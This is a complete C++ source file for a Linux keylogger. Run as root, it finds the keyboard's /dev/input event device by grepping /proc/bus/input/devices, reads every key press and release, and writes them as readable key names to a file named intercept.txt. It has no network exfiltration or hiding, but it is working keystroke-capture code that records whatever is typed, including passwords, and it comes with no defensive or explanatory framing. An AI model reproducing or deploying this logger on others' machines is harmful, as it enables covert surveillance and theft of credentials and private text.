#include <linux/input.h>
#include <cstdio>
#include <unistd.h>
#include <string>
#include <fstream>
#include <vector>
#include <csignal>
#include <algorithm>
#include <iostream>
#include <sstream>
#include <sys/stat.h>
#include <fcntl.h>

using std::ofstream;
using std::vector;
using std::string;

string determine_input_device();
void set_signal_handling();
std::string execute(std::string cmd);
vector<string> setup_keys();

ofstream out("intercept.txt", ofstream::out);

int main(int argc, char **argv) {
    input_event event;

    uid_t gid = getegid();
    uid_t uid = geteuid();
    if (gid != 0 || uid != 0) {
        std::cerr << "This must be run as root" << std::endl;
        return EXIT_FAILURE;
    }

    string input_device = determine_input_device();
    int keyboard_fd = open(input_device.c_str(), O_RDONLY);
    set_signal_handling();

    vector<string> keys = setup_keys();

    int i = 0;
    int insert_new_line = 30;

    while (read(keyboard_fd, &event, sizeof(event)) > 0) {
        if (event.type != EV_KEY) {
            continue;
        }
        if (event.value == 0) {
            out << "↑";
        } else {
            out << "↓";
        }
        out << keys[event.code];
        if (++i == insert_new_line) {
            i = 0;
            out << std::endl;
        }
    }
    out.close();


    return 0;
}

vector<string> setup_keys() {
    // see https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h

    vector<string> keys(255, "");
    keys[KEY_RESERVED] = "<RESERVED>";
    keys[KEY_ESC] = "<ESC>";
    keys[KEY_1] = "1";
    keys[KEY_2] = "2";
    keys[KEY_3] = "3";
    keys[KEY_4] = "4";
    keys[KEY_5] = "5";
    keys[KEY_6] = "6";
    keys[KEY_7] = "7";
    keys[KEY_8] = "8";
    keys[KEY_9] = "9";
    keys[KEY_0] = "0";
    keys[KEY_MINUS] = "-";
    keys[KEY_EQUAL] = "=";
    keys[KEY_BACKSPACE] = "<BKSPCE>";
    keys[KEY_TAB] = "<TAB>";
    keys[KEY_Q] = "q";
    keys[KEY_W] = "w";
    keys[KEY_E] = "e";
    keys[KEY_R] = "r";
    keys[KEY_T] = "t";
    keys[KEY_Y] = "y";
    keys[KEY_U] = "u";
    keys[KEY_I] = "i";
    keys[KEY_O] = "o";
    keys[KEY_P] = "p";
    keys[KEY_LEFTBRACE] = "{";
    keys[KEY_RIGHTBRACE] = "}";
    keys[KEY_ENTER] = "<ENTER>";
    keys[KEY_LEFTCTRL] = "<L CTRL>";
    keys[KEY_A] = "a";
    keys[KEY_S] = "s";
    keys[KEY_D] = "d";
    keys[KEY_F] = "f";
    keys[KEY_G] = "g";
    keys[KEY_H] = "h";
    keys[KEY_J] = "j";
    keys[KEY_K] = "k";
    keys[KEY_L] = "l";
    keys[KEY_SEMICOLON] = ";";
    keys[KEY_APOSTROPHE] = "'";
    keys[KEY_GRAVE] = "`";
    keys[KEY_LEFTSHIFT] = "<L SHIFT>";
    keys[KEY_BACKSLASH] = "\\";
    keys[KEY_Z] = "z";
    keys[KEY_X] = "x";
    keys[KEY_C] = "c";
    keys[KEY_V] = "v";
    keys[KEY_B] = "b";
    keys[KEY_N] = "n";
    keys[KEY_M] = "m";
    keys[KEY_COMMA] = ",";
    keys[KEY_DOT] = ".";
    keys[KEY_SLASH] = "/";
    keys[KEY_RIGHTSHIFT] = "<R SHIFT>";
    keys[KEY_KPASTERISK] = "*";
    keys[KEY_LEFTALT] = "<L ALT>";
    keys[KEY_SPACE] = " ";
    keys[KEY_CAPSLOCK] = "<CAPS LOCK>";
    keys[KEY_F1] = "<F1>";
    keys[KEY_F2] = "<F2>";
    keys[KEY_F3] = "<F3>";
    keys[KEY_F4] = "<F4>";
    keys[KEY_F5] = "<F5>";
    keys[KEY_F6] = "<F6>";
    keys[KEY_F7] = "<F7>";
    keys[KEY_F8] = "<F8>";
    keys[KEY_F9] = "<F9>";
    keys[KEY_F10] = "<F10>";
    keys[KEY_NUMLOCK] = "<NUM LOCK>";
    keys[KEY_SCROLLLOCK] = "<SCRL LOCK>";
    keys[KEY_KP7] = "7";
    keys[KEY_KP8] = "8";
    keys[KEY_KP9] = "9";
    keys[KEY_KPMINUS] = "-";
    keys[KEY_KP4] = "4";
    keys[KEY_KP5] = "5";
    keys[KEY_KP6] = "6";
    keys[KEY_KPPLUS] = "+";
    keys[KEY_KP1] = "1";
    keys[KEY_KP2] = "2";
    keys[KEY_KP3] = "3";
    keys[KEY_KP0] = "0";
    keys[KEY_KPDOT] = ".";

    keys[KEY_ZENKAKUHANKAKU] = "<ZENKAKUHANKAKU>";
    keys[KEY_102ND] = "<102ND>";
    keys[KEY_F11] = "F11";
    keys[KEY_F12] = "F12";
    keys[KEY_RO] = "<RO>";
    keys[KEY_KATAKANA] = "<KATKANA>";
    keys[KEY_HIRAGANA] = "<HIRAGANA>";
    keys[KEY_HENKAN] = "<HENKAN>";
    keys[KEY_KATAKANAHIRAGANA] = "<KATAKANAHIRAGANA>";
    keys[KEY_MUHENKAN] = "<MUHENKAN>";
    keys[KEY_KPJPCOMMA] = "<KPJPCOMMA>";
    keys[KEY_KPENTER] = "<ENTER>";
    keys[KEY_RIGHTCTRL] = "<R CNTL>";
    keys[KEY_KPSLASH] = "/";
    keys[KEY_SYSRQ] = "<SYS REQ>";
    keys[KEY_RIGHTALT] = "<R ALT>";
    keys[KEY_LINEFEED] = "<LINEFEED>";
    keys[KEY_HOME] = "<HOME>";
    keys[KEY_UP] = "<UP>";
    keys[KEY_PAGEUP] = "<PG UP>";
    keys[KEY_LEFT] = "<L ARROW>";
    keys[KEY_RIGHT] = "<R ARROW>";
    keys[KEY_END] = "<END>";
    keys[KEY_DOWN] = "<D ARROW>";
    keys[KEY_PAGEDOWN] = "<PG DOWN>";
    keys[KEY_INSERT] = "<INSERT>";
    keys[KEY_DELETE] = "<DEL>";
    keys[KEY_MACRO] = "<MACRO>";
    keys[KEY_MUTE] = "<MUTE>";
    keys[KEY_VOLUMEDOWN] = "<VOL DOWN>";
    keys[KEY_VOLUMEUP] = "<VOL UP>";
    keys[KEY_POWER] = "<PWR>";
    keys[KEY_KPEQUAL] = "=";
    keys[KEY_KPPLUSMINUS] = "<+->";
    keys[KEY_PAUSE] = "<PAUSE>";
    keys[KEY_SCALE] = "<SCALE>";

    keys[KEY_KPCOMMA] = ",";
    keys[KEY_HANGEUL] = "<HANGEUL>";
    keys[KEY_HANJA] = "<HANJA>";
    keys[KEY_YEN] = "<YEN>";
    keys[KEY_LEFTMETA] = "<L META>";
    keys[KEY_RIGHTMETA] = "<R META>";
    keys[KEY_COMPOSE] = "<COMPOSE>";

    keys[KEY_STOP] = "<STOP>";
    keys[KEY_AGAIN] = "<AGAIN>";
    keys[KEY_PROPS] = "<PROPS>";
    keys[KEY_UNDO] = "<UNDO>";
    keys[KEY_FRONT] = "<FRONT>";
    keys[KEY_COPY] = "<COPY>";
    keys[KEY_OPEN] = "<OPEN>";
    keys[KEY_PASTE] = "<PASTE>";
    keys[KEY_FIND] = "<FIND>";
    keys[KEY_CUT] = "<CUT>";
    keys[KEY_HELP] = "<HELP>";
    keys[KEY_MENU] = "<MENU>";
    keys[KEY_CALC] = "<CALC>";
    keys[KEY_SETUP] = "<SETUP>";
    keys[KEY_SLEEP] = "<SLEEP>";
    keys[KEY_WAKEUP] = "<WAKEUP>";
    keys[KEY_FILE] = "<FILE>";
    keys[KEY_SENDFILE] = "<SENDFILE>";
    keys[KEY_DELETEFILE] = "<DELETEFILE>";
    keys[KEY_XFER] = "<XFER>";
    keys[KEY_PROG1] = "<PROG1>";
    keys[KEY_PROG2] = "<PROG2>";
    keys[KEY_WWW] = "<WWW>";
    keys[KEY_MSDOS] = "<MSDOS>";
    keys[KEY_COFFEE] = "<COFFEE>";
    keys[KEY_SCREENLOCK] = "<SCREEN LOCK>";
    keys[KEY_ROTATE_DISPLAY] = "<ROT DISPLAY>";
    keys[KEY_DIRECTION] = "<DIRECTION>";
    keys[KEY_CYCLEWINDOWS] = "<CYCLEWINDOWS>";
    keys[KEY_MAIL] = "<MAIL>";
    keys[KEY_BOOKMARKS] = "<BOOKMARKS>";
    keys[KEY_COMPUTER] = "<COMPUTER>";
    keys[KEY_BACK] = "<BACK>";
    keys[KEY_FORWARD] = "<FORWARD>";
    keys[KEY_CLOSECD] = "<CLOSE CD>";
    keys[KEY_EJECTCD] = "<EJECT CD>";
    keys[KEY_EJECTCLOSECD] = "<CLOSE EJECT CD>";
    keys[KEY_NEXTSONG] = "<NEXT SONG>";
    keys[KEY_PLAYPAUSE] = "<PLAY PAUSE>";
    keys[KEY_PREVIOUSSONG] = "<PREVIOUS SONG>";
    keys[KEY_STOPCD] = "<STOP CD>";
    keys[KEY_RECORD] = "<RECORD>";
    keys[KEY_REWIND] = "<REWIND>";
    keys[KEY_PHONE] = "<PHONE>";
    keys[KEY_ISO] = "<ISO>";
    keys[KEY_CONFIG] = "<CONFIG>";
    keys[KEY_HOMEPAGE] = "<HOMEPAGE>";
    keys[KEY_REFRESH] = "<REFRESH>";
    keys[KEY_EXIT] = "<EXIT>";
    keys[KEY_MOVE] = "<MOVE>";
    keys[KEY_EDIT] = "<EDIT>";
    keys[KEY_SCROLLUP] = "<SCRL UP>";
    keys[KEY_SCROLLDOWN] = "<SCRL DOWN>";
    keys[KEY_KPLEFTPAREN] = "(";
    keys[KEY_KPRIGHTPAREN] = ")";
    keys[KEY_NEW] = "<NEW>";
    keys[KEY_REDO] = "<REDO>";

    keys[KEY_F13] = "<F13>";
    keys[KEY_F14] = "<F14>";
    keys[KEY_F15] = "<F15>";
    keys[KEY_F16] = "<F16>";
    keys[KEY_F17] = "<F17>";
    keys[KEY_F18] = "<F18>";
    keys[KEY_F19] = "<F19>";
    keys[KEY_F20] = "<F20>";
    keys[KEY_F21] = "<F21>";
    keys[KEY_F22] = "<F22>";
    keys[KEY_F23] = "<F23>";
    keys[KEY_F24] = "<F24>";

    keys[KEY_PLAYCD] = "<PLAY CD>";
    keys[KEY_PAUSECD] = "<PAUSE CD>";
    keys[KEY_PROG3] = "<PROG 3>";
    keys[KEY_PROG4] = "<PROG 4>";
    keys[KEY_DASHBOARD] = "<DASHBOARD>";
    keys[KEY_SUSPEND] = "<SUSPEND>";
    keys[KEY_CLOSE] = "<CLOSE>";
    keys[KEY_PLAY] = "<PLAY>";
    keys[KEY_FASTFORWARD] = "<FASTFORWARD>";
    keys[KEY_BASSBOOST] = "<BASSBOOST>";
    keys[KEY_PRINT] = "<PRINT>";
    keys[KEY_HP] = "<HP>";
    keys[KEY_CAMERA] = "<CAMERA>";
    keys[KEY_SOUND] = "<SOUND>";
    keys[KEY_QUESTION] = "<QUESTION>";
    keys[KEY_EMAIL] = "<EMAIL>";
    keys[KEY_CHAT] = "<CHAT>";
    keys[KEY_SEARCH] = "<SEARCH>";
    keys[KEY_CONNECT] = "<CONNECT>";
    keys[KEY_FINANCE] = "<FINANCE>";
    keys[KEY_SPORT] = "<SPORT>";
    keys[KEY_SHOP] = "<SHOP>";
    keys[KEY_ALTERASE] = "<ALT ERASE>";
    keys[KEY_CANCEL] = "<CANCEL>";
    keys[KEY_BRIGHTNESSDOWN] = "<BRIGHTNESS DOWN>";
    keys[KEY_BRIGHTNESSUP] = "<BRIGHTNESS UP>";
    keys[KEY_MEDIA] = "<MEDIA>";

    return keys;
}

void signal_handler(int signal) {
    out.close();
}

void set_signal_handling()
{
  struct sigaction act = {{0}};
  act.sa_handler = signal_handler;
  sigaction(SIGHUP,  &act, NULL);
  sigaction(SIGINT,  &act, NULL);
  sigaction(SIGTERM, &act, NULL);
  // prevent child processes from becoming zombies
  act.sa_handler = SIG_IGN;
  sigaction(SIGCHLD, &act, NULL);
}

// executes cmd and returns string ouput
std::string execute(std::string cmd)
{
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) {
        return "";
    }
    char buffer[128];
    std::string result = "";
    while(!feof(pipe)) {
    	if(fgets(buffer, 128, pipe) != NULL) {
    		result += buffer;
        }
    }
    pclose(pipe);
    return result;
}

// taken from https://github.com/kernc/logkeys/blob/master/src/logkeys.cc
string determine_input_device()
{
    uid_t gid = getegid();
    uid_t uid = geteuid();
    // switch to nobody
    setegid(65534);
    seteuid(65534);

    //Look for devices with keybit bitmask that has keys a keyboard doeas
    //If a bitmask ends with 'e', it supports KEY_2, KEY_1, KEY_ESC, and KEY_RESERVED is set to 0, so it's probably a keyboard
    //keybit:     https://github.com/torvalds/linux/blob/02de58b24d2e1b2cf947d57205bd2221d897193c/include/linux/input.h#L45
    //keycodes: https://github.com/torvalds/linux/blob/139711f033f636cc78b6aaf7363252241b9698ef/include/uapi/linux/input-event-codes.h#L75
    //Take the Name, Handlers, and KEY values
    string cmd = "/bin/grep -B8 -E 'KEY=.*e$' /proc/bus/input/devices | /bin/grep -E 'Name|Handlers|KEY'";
    std::stringstream output(execute(cmd), std::ios_base::in);

    std::vector<std::string> devices;
    std::vector<unsigned short> scores;
    std::string line;

    unsigned short line_type = 0;
    unsigned short score = 0;

    while(std::getline(output, line)) {
        transform(line.begin(), line.end(), line.begin(), ::tolower);

        //Generate score based on device name
        if(line_type == 0){
            if (line.find("keyboard") != std::string::npos){
                score += 100;
            }
        }
        //Add the event handler
        else if(line_type == 1){
            std::string::size_type i = line.find("event");
            if (i != std::string::npos) i += 5; // "event".size() == 5
            if (i < line.size()) {
                int index = atoi(&line.c_str()[i]);

                if (index != -1) {
                    std::stringstream input_dev_path;
                    input_dev_path << "/dev/input/";
                    input_dev_path << "event";
                    input_dev_path << index;

                    devices.push_back(input_dev_path.str());
                }
            }
        }
        //Generate score based on size of key bitmask
        else if(line_type == 2){
            std::string::size_type i = line.find("=");
            std::string full_key_map = line.substr(i + 1);
            score += full_key_map.length();
            scores.push_back(score);
            score = 0;
        }
        line_type = (line_type + 1) % 3;
    }

    if (devices.size() == 0) {
        std::cerr << "Couldn't determine keyboard device. :/";
        return "";
    }

    //Choose device with the best score
    int max_device = std::max_element(scores.begin(), scores.end()) - scores.begin();
    seteuid(uid);
    setegid(gid);
    return devices[max_device];    // for now, use only the first found device
}
